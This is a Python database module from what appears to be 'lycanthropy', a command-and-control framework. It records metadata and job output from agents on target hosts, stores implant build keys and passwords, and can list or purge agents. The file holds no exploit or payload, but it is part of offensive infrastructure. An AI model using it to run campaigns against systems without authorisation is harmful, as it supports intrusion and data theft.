import lycanthropy.sql.broker
import lycanthropy.sql.sanitize
import lycanthropy.sql.interface
import lycanthropy.sql.security
import uuid
import os

def storeData(campaign,acid,module,timestamp,job,output):
    if lycanthropy.sql.security.chkAcid(acid) == False:
        return {'error':'malformed dataflow'}
    if lycanthropy.sql.sanitize.strValidate(campaign) and campaign in os.listdir('campaign'):
        blankQuery = """INSERT INTO campaign(acid, record, module, timestamp, job, campaign, output) VALUES(:acid, :record, :module, :timestamp, :job, :campaign, :output)"""
    else:
        return {'error':'malformed dataflow'}
    try:
        lycanthropy.sql.broker.runQuery(
            blankQuery,
            {
                'acid':acid,
                'record':str(uuid.uuid4()).replace('-',''),
                'module':module,
                'timestamp':timestamp,
                'job':job,
                'campaign':campaign,
                'output':output
            }
        )
        return {'output':'successfully ingested dataflow'}
    except:
        return {'error':'malformed dataflow'}


def storeMeta(acid,hostname,ip,os,arch,integrity,user,cwd,domain,registered):
    if lycanthropy.sql.security.chkAcid(acid) == False:
        return {'error':'malformed dataflow'}
    blankQuery = """INSERT INTO metadata(acid, hostname, ip, os, arch, integrity, user, cwd, domain, registered, status) VALUES(:acid, :hostname, :ip, :os, :arch, :integrity, :user, :cwd, :domain, :registered, :status)"""
    return lycanthropy.sql.broker.runQuery(
        blankQuery,
        {
            'acid':acid,
            'hostname':hostname,
            'ip':ip,
            'os':os,
            'arch':arch,
            'integrity':integrity,
            'user':user,
            'cwd':cwd,
            'domain':domain,
            'registered':registered,
            'status':'active'
        }
    )



def storeBuild(acid,ctrlKey,distKey,ccKey,password,confKey,tempAcid,pkgCore,regPass,regKey,tcKey,campaign):
    blankQuery = """INSERT INTO build(ctrlKey, distKey, ccKey, password, acid, confKey, pkgCore, tempAcid, regPass, regKey, tcKey, campaign) VALUES(:ctrlKey, :distKey, :ccKey, :password, :acid, :confKey, :pkgCore, :tempAcid, :regPass, :regKey, :tcKey, :campaign)"""
    return lycanthropy.sql.broker.runQuery(
        blankQuery,
        {
            'acid':acid,
            'ctrlKey':ctrlKey,
            'distKey':distKey,
            'ccKey':ccKey,
            'password':password,
            'confKey':confKey,
            'tempAcid':tempAcid,
            'pkgCore':pkgCore,
            'regPass':regPass,
            'regKey':regKey,
            'tcKey':tcKey,
            'campaign':campaign
        }
    )

def getBuilds():
    #dump build configs
    blankQuery = """SELECT * FROM build"""
    return lycanthropy.sql.broker.runQuery(
        blankQuery,
        {}
    )

def getAgents():
    #dump agents, filter at interface
    blankQuery = """SELECT * FROM metadata"""
    return lycanthropy.sql.broker.runQuery(
        blankQuery,
        {}
    )

def getCampaigns():
    blankQuery = """SHOW TABLES FROM lycanthropy"""
    return lycanthropy.sql.broker.runQuery(
        blankQuery,
        {}
    )

def getData():

    blankQuery = """SELECT * FROM campaign"""
    return lycanthropy.sql.broker.runQuery(
        blankQuery,
        {}
    )


def getUsers():
    blankQuery = """SELECT * FROM access"""
    return lycanthropy.sql.broker.runQuery(
        blankQuery,
        {}
    )

def purgeAgent(acid):
    blankQuery = """DELETE FROM lycanthropy.metadata WHERE acid=:acid"""
    return lycanthropy.sql.broker.runQuery(
        blankQuery,
        {'acid':acid}
    )